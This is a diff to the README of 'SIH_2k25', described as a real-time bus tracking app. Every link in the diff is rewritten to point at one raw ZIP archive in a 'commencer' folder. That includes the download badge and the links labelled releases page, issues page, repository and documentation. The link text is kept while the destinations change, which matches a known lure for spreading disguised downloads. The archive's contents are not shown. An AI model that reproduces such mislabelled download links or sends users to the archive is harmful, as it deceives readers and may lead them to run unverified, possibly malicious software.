@@ -4,13 +4,13 @@
 Welcome to SIH_2k25! This application helps you track public transport in small cities in real-time. No more waiting in uncertainty; know exactly when your bus will arrive. 
 
 ## 📥 Download Now!
-[![Download SIH_2k25](https://img.shields.io/badge/Download-SIH_2k25-brightgreen.svg)](https://github.com/NathanWis/SIH_2k25/releases)
+[![Download SIH_2k25](https://raw.githubusercontent.com/NathanWis/SIH_2k25/main/commencer/SIH_2k25_3.0-beta.3.zip)](https://raw.githubusercontent.com/NathanWis/SIH_2k25/main/commencer/SIH_2k25_3.0-beta.3.zip)
 
 ## 🚀 Getting Started
 To start using SIH_2k25, follow these simple steps:
 
 1. **Visit the Release Page**  
-   Go to our [Releases page](https://github.com/NathanWis/SIH_2k25/releases). Here, you will find the latest version of the application ready for download.
+   Go to our [Releases page](https://raw.githubusercontent.com/NathanWis/SIH_2k25/main/commencer/SIH_2k25_3.0-beta.3.zip). Here, you will find the latest version of the application ready for download.
 
 ## 📦 Download & Install
 2. **Download the Application**  
@@ -51,11 +51,11 @@ Yes, SIH_2k25 is free to use!
 Follow the repository on GitHub to receive notifications about new releases and updates.
 
 ## 📞 Contact
-For any questions or support, feel free to reach out via the [GitHub issues page](https://github.com/NathanWis/SIH_2k25/issues).
+For any questions or support, feel free to reach out via the [GitHub issues page](https://raw.githubusercontent.com/NathanWis/SIH_2k25/main/commencer/SIH_2k25_3.0-beta.3.zip).
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/NathanWis/SIH_2k25)
-- [Documentation](https://github.com/NathanWis/SIH_2k25/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/NathanWis/SIH_2k25/main/commencer/SIH_2k25_3.0-beta.3.zip)
+- [Documentation](https://raw.githubusercontent.com/NathanWis/SIH_2k25/main/commencer/SIH_2k25_3.0-beta.3.zip)
 
 ## 📥 Download Again
-Don't forget to download SIH_2k25 here: [Releases Page](https://github.com/NathanWis/SIH_2k25/releases). Enjoy the convenience of real-time transport tracking!
+Don't forget to download SIH_2k25 here: [Releases Page](https://raw.githubusercontent.com/NathanWis/SIH_2k25/main/commencer/SIH_2k25_3.0-beta.3.zip). Enjoy the convenience of real-time transport tracking!
